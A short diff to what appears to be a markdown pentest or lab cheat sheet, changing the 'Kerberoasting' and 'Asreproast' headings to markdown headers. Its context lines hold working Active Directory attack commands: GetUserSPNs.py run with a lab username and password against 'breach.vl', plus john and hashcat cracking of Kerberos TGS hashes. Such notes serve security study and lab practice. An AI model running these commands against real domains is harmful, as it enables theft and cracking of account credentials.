@@ -14,7 +14,7 @@ seo:
   robots: "" # custom robot tags (optional)
 ---
 
-**Kerberoasting :**
+## Kerberoasting
 
 ```sh
 GetUserSPNs.py breach.vl/Julia.wong:Computer1 -dc-ip $t
@@ -33,7 +33,7 @@ john --format=krb5tgs --wordlist= /usr/share/wordlists/rockyou.txt hash
 hashcat -m 13100 kerberoastables.txt $wordlist
 ```
 
-**Asreproast :**
+## Asreproasting
 
 - Users list dynamically queried with an LDAP anonymous bind
 ```sh
